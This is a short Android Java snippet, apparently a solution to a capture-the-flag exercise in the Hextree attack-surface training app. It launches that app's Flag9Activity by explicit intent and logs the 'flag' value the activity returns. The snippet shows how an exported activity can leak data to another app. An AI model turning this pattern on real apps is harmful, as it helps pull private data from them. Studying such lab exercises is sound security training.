        // in Oncreate Method 
        Intent intent = new Intent();
        intent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag9Activity");
        startActivityForResult(intent,42);


        // out of Oncreate Method
        @Override
        public void onActivityResult(int requestCode, int resultCode, @Nullable Intent data, @NonNull ComponentCaller caller) {
            super.onActivityResult(requestCode, resultCode, data, caller);
            //String flag = data.getStringExtra("flag");
            Log.i("Flag9: ", data.getStringExtra("flag"));
        }